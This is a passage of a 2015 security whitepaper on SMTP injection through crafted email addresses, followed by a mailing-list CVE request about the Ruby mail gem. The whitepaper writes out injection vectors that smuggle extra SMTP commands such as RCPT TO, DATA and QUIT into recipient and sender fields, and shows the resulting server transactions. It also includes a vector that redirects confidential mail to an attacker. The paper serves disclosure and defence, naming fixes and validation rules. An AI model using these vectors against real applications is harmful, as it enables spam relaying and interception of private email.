553 5.0.0 <(... Unbalanced '('‚Üµ
; response to 8.1
250 2.1.5 to@example.jp... Recipient ok‚Üµ
; response to 8.2
354 Enter mail, end with "." on a line by itself‚Üµ  ; response to 8.3
250 2.0.0 xxx Message accepted for delivery‚Üµ
; response to 8.7

QUIT‚Üµ

The transaction above is ‚Äúirregular‚Äù for two reasons. One is that it contains commands led

by  a  space  such  as  "[SP]RCPT TO"  in  #8.2,  and  the  other  is  that  it  contains  a  command

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

6

followed by a backslash that is "[SP]DATA \" in #8.3.

The former command with a leading space is confirmed to be interpreted normally on Postfix

and Sendmail, and the latter command followed by backslash on Sendmail as well. Putting

them  together,  this  specific  vector  works  on  Sendmail  (it  works  on  Postfix  with  a  slight

modification,  though),  and  consequently  the  attacker-injected  email  is  delivered  to  the

victim‚Äôs mailbox.

Note that, in general, when MTAs relay the email to the next server, the garbage parts such

as leading spaces and following backslashes are removed. Thus, the restriction on the MTA

product type is applied only to the one the SMTP client library directly speaks to.

MBSD  reported  this  bug  to  the  vendor,  Synchromedia  in  November  2015.  The  vendor

released a fixed version (v5.2.14) within a couple of days after being notified. Upgrading to

the latest version like other products already mentioned is recommended.

In  this  attack,  some  MTAs,  namely  Sendmail  and  Postfix  can  also  be  said  excessively

permissive or even incompliant to the standard. However, we think the fault is more on the

SMTP client‚Äôs side, which sends illegal and misleading commands to the MTA, than on the

MTA‚Äôs side.

What should be emphasized here again is that the occurrence of line-break is compliant to

RFC  5322  as  long  as  it  constitutes  an  FWS  or  obs-qp.  FWS  and  obs-qp  can  appear  in  the

comment,  quoted-string  and  some  other  parts  in  an  email  address.  Meanwhile  the  SMTP

standard RFC 5321 [12] does not allow line-break occurrences at all.

For clarification, the key differences between the two RFC‚Äôs are shown in the table below:

RFC 5321

RFC 5322

Simple Mail Transfer Protocol

Internet Message Format

Spec scope

SMTP, envelope of mail object

Content of mail object

Context of
email addresses

SMTP commands,
MAIL FROM and RCPT TO

Content headers,
From, To and so on

Line-breaks in
email addresses

Not allowed

Allowed in
- FWS (Folding White Space)
- obs-qp (obsolete syntax)

In  essence,  email  addresses  passed  to  SMTP  commands  should  be  validated  as  per  RFC

5321, but not RFC 5322. However, as seen in the PHPMailer‚Äôs bug, confusion between the

two RFCs is often seen in SMTP client libraries.

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

7

Such confusion is further discussed in the next chapter.

3.4.  Other platforms

The libraries mentioned in this chapter, which are Ruby‚Äôs Mail, JavaMail and PHPMailer,

are not the only ones affected by the recipient attack.

In  our  penetration  testing  in  the  last  few  years,  MBSD  found  two  other  web  applications

using PHP and CGI (the programing language is unknown) that were vulnerable to the most

basic form of the recipient attack described in chapter 2.

We are not  certain which libraries were exactly in use in these vulnerable applications  as

they  were  discovered  during  our  black-box  tests.  We  assume  they  were  using  in-house

custom libraries or minor ones; because we found that many major email libraries at least

attempt to validate email addresses in some way or another, even though the validation may

be flawed as proven in this chapter.

In  any  case,  considering  the  possibility  of  applications‚Äô  using  poorly  written  libraries,

security  test  of  this  type  is  worth  performing  regardless  of  the  platform  in  which  the

applications run.

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

8

4.  Further attack possibility

In  this  chapter,  some  miscellaneous  topics  furthering  the  recipient  attack  are  discussed.

Note that the techniques or ideas described here are mostly theoretical and have not been

confirmed to work effectively on real environments.

4.1.  FWS Attack

As described in section 3.3, email addresses compliant to RFC 5322 may contain two types of

line-breaks,  which  are  obs-qp  and  FWS.  Obs-qp  is  rarely  accepted  by  the  email  libraries,

while FWS is more often accepted. Therefore, this section discusses attacks using only FWS.

The first attack target is "SmtpClient" class of ASP.NET v4.0.30319, the latest version as of

this  writing.  This  is  a  built-in  class  commonly  used  for  SMTP  email  delivery  purposes

in .NET applications [13].

Let‚Äôs look at the attack vector, which is an RFC-5322-compliant address containing FWS.

rcpt="xx[CRLF][SP]RCPT TO:to@example.jp[CRLF][SP]DATA[CRLF][SP]zz"@mbsd.jp

The resulting SMTP transaction is:

8.1:
8.2:
8.3:
8.4:
9:
10:
11:

RCPT TO:<"xx‚Üµ
[SP]RCPT TO:to@example.jp‚Üµ
[SP]DATA‚Üµ
[SP]zz"@mbsd.jp>‚Üµ

501 5.1.3 Bad recipient address syntax‚Üµ
250 2.1.5 Ok‚Üµ
354 Please start mail input.‚Üµ

; response to 8.1
; response to 8.2
; response to 8.3

Leading spaces of the commands are simply ignored by Postfix and Sendmail, as explained

in the previous chapter. Thus the injected commands are interpreted by the server as you

can see above.

However, to only state the end result, we could not achieve a complete exploitation of this

bug  in  our  research.  The  reason  is  that  the  DATA  section  requires  "[CRLF].[CRLF]"  at  its

end, but such sequence is rejected by SmtpClient‚Äôs validation. Additionally, neither Postfix

nor Sendmail interprets "[CRLF][SP].[CRLF]" as the end of the section.

This means there is no way to end the DATA section in the attack using only FWS (recall that,

in the PHPMailer‚Äôs attack, we combined FWS and obs-qp to terminate DATA section).

Another  command  we  tried  was  "BDAT",  which  is  an  optional  SMTP  command  defined  in

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

9

RFC  3030  [14].  It  is  a  command  similar  to,  but  different  from  DATA  in  terms  of  BDAT  not

requiring a single period line at the end. However, the command seems to be supported only

by MS Exchange, which does not accept leading spaces.

Consequently, as long as the recent versions of the three major MTAs (Postfix, Sendmail and

MS  Exchange)  are  in  use,  this  SmtpClient‚Äôs  misbehavior  is  unlikely  to  be  exploitable  for

spamming  purposes.  Moreover,  we  are  not  presently  aware  of  other  MTAs  affected  by  the

bug.

The  behavior  is  not  specific  to  SmtpClient  class  of  .NET.  The  same  behavior  is  seen  in

Sendmail  command  (v8.15.2,  when  a  recipient  address  is  given  from  a  command  line

argument)  and  Swift  Mailer  (v5.4.1,  a  PHP‚Äôs  mail  library).  They  pass  a  supplied

RFC-5322-compliant  address  to  an  SMTP‚Äôs  "RCPT TO"  command  just  as  it  is,  even  if  the

address  contains  FWS.  But  their  bug  is  unlikely  to  be  exploitable  just  like  that  of

SmtpClient.

In  any  event,  what  these  libraries  are  expected  to  do  in  the  first  place  is  to  normalize  an

email  address  by  replacing  each  FWS  occurrence  with  SP  or  to  validate  an  email  address

passed to SMTP commands according to RFC 5321, not RFC 5322.

4.2.  CRLF-less attack

One of the author‚Äôs co-workers, Toshitsugu Yoneyama discovered an interesting behavior of

older versions of Postfix.

He found that when an overlong command is given, Postfix splits the command string into

chunks at most 2048 bytes long and then processes each chunk as an individual command in

order. This suggests a possibility of CRLF-less SMTP Injection attack specific to Postfix.

The following figure illustrates this attack idea.

However,  it  turned  out  that  this  idea  cannot  be  used  for  spamming  attack  because  of  the

"[CRLF].[CRLF]" hurdle, which is exactly what confronted us in the FWS attack described

in the previous section.

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

10

RCPT TO:<"‚ê£‚ê£(SP padding)‚Ä¶RCPT TO:a@example.jp‚ê£‚ê£‚Ä¶DATA‚ê£‚ê£‚Ä¶2048bytes2048bytesLong email address input

We tried to combine this splitting behavior with FWS attack, but  what was possible in the

end  was  sending  an  email  with  a  blank  content,  which  is  quite  useless  from  a  spammer's

perspective.

This is because the splitting does not occur in the message content  inside the DATA section.

Then, ".[CRLF][SP]" has to be placed immediately after the DATA command with trailing

spaces in order to terminate the DATA section gracefully.

This Postfix‚Äôs behavior cannot be reproduced in newer versions. For instance,  it cannot be

reproduced in v2.10.1 (the latest version in the official RPM packages for CentOS 7.x), while

it  can  be  in  v2.6.6  (that  for  CentOS  6.x).  This  indicates  a  certain  change  was  made

somewhere  between  the  two  versions,  presumably  in  v2.9.0,  which  introduced  a  flag

(SMTP_GET_FLAG_SKIP) to skip the overlong part of the command.

The countermeasure of this attack is restricting the length of email addresses according to

section 4.5.3 of RFC 5321 [15] or upgrading Postfix.

4.3.  Line-breaks for SMTP servers

RFC  5321  clearly  states  that  only  CRLF  is  the  SMTP‚Äôs  command  line  separator.  In  other

words, neither single LF nor CR should occur in the command line. They should also not be

interpreted as a separator by command recipient.

During the research, none of the three MTAs we tested (Postfix,  Sendmail  and Exchange)

was  found  to  treat  single  CR  as  a  separator.  Neither  was  VT  (Vertical  Tab,  0x0B)  nor  FF

(Form  Feed,  0x0C).  However,  Postfix  and  Sendmail  were  confirmed  to  treat  LF  as  a

separator against the RFC text, whereas MS Exchange complies with the text.

This  incompliance  of  Postfix  and  Sendmail  may  result  in  a  vulnerability  if  both  the

application and SMTP client library handle only CRLF properly. However, we could not find

any realistic example that this incompliance leads to a vulnerability because many libraries

that properly handle CRLF seem to do the same for single LF, too.

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

11

‚ê£‚ê£‚Ä¶DATA‚ê£‚ê£‚ê£‚ê£‚ê£‚ê£‚ê£‚ê£‚ê£‚Ä¶.[CRLF]‚ê£QUIT[CRLF]‚ê£2048bytesLong email address input

5.  Sender address attack

Although this paper focuses on the recipient email addresses, the sender address in "MAIL

FROM" command can obviously be another injection target as well.

When  performing  a  test  targeting  a  sender  address,  all  of  the  essential  SMTP  commands

must appear in order and without omission in the resulting SMTP transaction.

This means attack vectors need a modification.

Vector for recipient
rcpt=to@example.jp>[CRLF]DATA[CRLF](message content)[CRLF].[CRLF]QUIT[CRLF]

Vector for sender
sndr=from@example.jp>[CRLF]RCPT TO:attacker@example.org[CRLF]DATA[CRLF]

The latter vector is intended to replace the original recipient address with the attacker‚Äôs by

supplying a crafted sender address.

The resulting SMTP transaction is shown below:

6.1:
6.2:
6.3:
6.4:
7:
8:
9:
10:
11:
12:
13:
14:
15:
16:

MAIL FROM:<from@example.com>‚Üµ
RCPT TO:attacker@example.org‚Üµ
DATA‚Üµ
>‚Üµ

250 2.1.0 Ok‚Üµ
250 2.1.0 Ok‚Üµ
354 Please start mail input.‚Üµ
RCPT TO:<original recipient address>‚Üµ
DATA‚Üµ
(original confidential message content)‚Üµ
.‚Üµ

; response to 6.1
; response to 6.2
; response to 6.3

QUIT‚Üµ

250 Mail queued for delivery.‚Üµ

; response to 13

221 Closing connection. Good bye.‚Üµ

; response to 15

As  the  result,  only  by  manipulating  the  sender  address,  the  attacker  receives  an  email

message containing the original confidential message content:

>
RCPT TO:<original recipient address>
DATA
(original confidential message content)

; input 6.4
; input 10
; input 11
; input 12

Of course, the attacker can also utilize this bug for spamming just by appending a string like

"(spam content)[CRLF].[CRLF]QUIT[CRLF]" at the end of the vector.

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

12

6.  Conclusion

This  paper  explained  how  the  SMTP  Injection  attack  through  a  crafted  recipient  email

address  works  and  showed  the  examples  of  vulnerable  SMTP  clients  and  the  possible

further attacks.

The countermeasure of this attack is to ensure that the email address being passed to "RCPT

TO" command is compliant to RFC 5321 in terms of syntax and length. The syntax rule is

defined in section 4.1.2 of the RFC, and  the length limit  is in  section  4.5.3.1.  Of course,  a

little more relaxed rule can be an option, as a small proportion of existing and actually used

addresses is known to be incompliant to the standard. Needless to say, when a relaxed rule

is employed, addresses containing line-breaks must not be allowed.

Note that, regarding the valid email address format, confusion between RFC 5321 and 5322

is sometimes seen; however, RFC 5321 should be referred in the context of SMTP.

At  MBSD  we  think  modern  SMTP  client  libraries  should  desirably  be  equipped  with  this

sort of validation mechanism, but it is not to say that the web application developers must

not perform the validation on their own. Whatever the case may be, an application is safe as

long as either the library or the application itself performs proper validation.

If  you  need  to  verify  whether  or  not  your  application  is  susceptible  to  the  attack  in  a

black-box manner, consider using the vector below (the most basic one):

rcpt=to@example.jp>[CRLF]DATA[CRLF](message content)[CRLF].[CRLF]QUIT[CRLF]

More advanced and somewhat library-specific vectors are shown in chapter 3.

If the application accepts a sender email address as an input, the vectors mentioned above

need a slight adjustment as described in chapter 5.

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

13

7.  References

[1]  http://www.webappsec.org/projects/articles/121106.pdf

[2]  http://projects.webappsec.org/w/page/13246948/Mail%20Command%20Injection

[3]  https://www.insomniasec.com/downloads/publications/Common_Application_Flaws.ppt

[4]  https://tools.ietf.org/html/rfc2920

[5]  https://rubygems.org/gems/mail

[6]  http://www.oracle.com/technetwork/java/javamail/index.html

[7]  https://java.net/projects/javamail/sources/mercurial/show

[8]  http://www.csnc.ch/misc/files/advisories/CSNC-2014-001_javamail_advisory_public.txt

[9]  https://java.net/projects/javamail/downloads

[10] https://github.com/PHPMailer/PHPMailer

[11] https://tools.ietf.org/html/rfc5322

[12] https://tools.ietf.org/html/rfc5321

[13] https://msdn.microsoft.com/library/system.net.mail.smtpclient(v=vs.110).aspx

[14] https://tools.ietf.org/html/rfc3030

[15] https://tools.ietf.org/html/rfc5321#section-4.5.3

[16] http://seclists.org/webappsec/2015/q4/14

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

14

8.  About us

About MBSD

MBSD (Mitsui Bussan Secure Directions, Inc.) is the Japanese leading security company in

managed  security  services,  vulnerability  assessment  and  testing,  GRC  (Governance,  Risk,

Compliance)  consulting,  incident  response  and  handling,  digital  forensics,  and  secure

programming training services. The MBSD services are provided by its personnel including

the  leading  security  experts  in  the  field  of  secure  programming,  application  security,

penetration testing and threat analysis who have in-depth knowledge and understanding of

attackers‚Äô methodologies. MBSD is working for the Internet infrastructure companies, cyber

commerce  and  media  giants,  financial  institutes,  global  enterprise,  and  government

agencies in Japan to support their strategies against rapidly increasing threats from cyber

space.

About the author

Takeshi Terada, CISSP is a Senior Security Specialist at MBSD Professional Service Dept.

Update History

12/17/2015

Added links to previous researches [1][3], thanks to one of the webappsec

mailing list readers [16].

Updated the URL of JavaMail‚Äôs download page [9].

  TT-1 Building 6F, 1-14-8, Nihonbashi Ningyo-Cho, Chuo-ku, Tokyo, 103-0013, Japan

+81-3-5649-1961 | http://www.mbsd.jp/

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

15



=== Content from openwall.com_b17b88c5_20250124_124539.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux ¬† *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper ¬† *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists ¬† *for password cracking*](/wordlists/)+ [passwdqc ¬† *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt ¬† *KDF & password hashing*](/yescrypt/)+ [yespower ¬† *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish ¬† *password hashing*](/crypt/)+ [phpass ¬† *ditto in PHP*](/phpass/)+ [tcb ¬† *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd ¬† *port scan detector*](/scanlogd/)+ [popa3d ¬† *tiny POP3 daemon*](/popa3d/)+ [blists ¬† *web interface to mailing lists*](/blists/)+ [msulogin ¬† *single user mode login*](/msulogin/)+ [php\_mt\_seed ¬† *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](4) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CALPTtNXyZaNwHaLa+XhB6Dvac1cy5EeVa+ce1aDRW4a5WGSJ6Q@mail.gmail.com>
Date: Fri, 11 Dec 2015 07:45:49 -0800
From: Reed Loden <reed@...dloden.com>
To: oss-security@...ts.openwall.com,
	Assign a CVE Identifier <cve-assign@...re.org>
Subject: CVE request: mail ruby gem <2.6.0 vulnerable to SMTP injection via
 recipient email addresses

Takeshi Terada (Mitsui Bussan Secure Directions, Inc.) released a
whitepaper entitled "SMTP Injection via recipient email addresses" (
<http://www.mbsd.jp/Whitepaper/smtpi.pdf>). This whitepaper has a section
discussing how one such vulnerability affected the 'mail' ruby gem (see
section 3.1).

Whitepaper has all the specific details, but basically the 'mail' ruby gem
module is prone to the recipient attack as it does not validate nor
sanitize given recipient addresses. Thus, the attacks described in chapter
2 of the whitepaper can be applied to the gem without any modification. The
'mail' ruby gem itself does not impose a length limit on email addresses,
so an attacker can send a long spam message via a recipient address unless
there is a limit on the application's side. This vulnerability affects only
the applications that lack input validation.

'mail' is a "A Really Ruby Mail Library" for Ruby.

Ruby gem: mail (<https://rubygems.org/gems/mail>)
Affects: 2.5.4 and earlier
Fixed in: 2.6.0
Fixed by
<https://github.com/mikel/mail/commit/72befdc4dab3e6e288ce226a7da2aa474cf5be83>

Can a CVE be assigned? Since the issue was fixed in 2013, not sure if that
means it needs a 2013 era CVE or if a 2015 one will work since it wasn't
found to be a vulnerability until this year.

Note, the paper author has informed me "BTW, while investigating the source
code of Mail, I came to think the fault might be more on Net::SMTP's side.
It is difficult to say who is responsible for it, Net::SMTP, Mail or
application developers (library users) though."

Either way, vuln needs to be tracked, and a change in 'mail' did mitigate
it for now (and affects all their delivery methods, not just 'smtp').

Thanks,
~reed

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


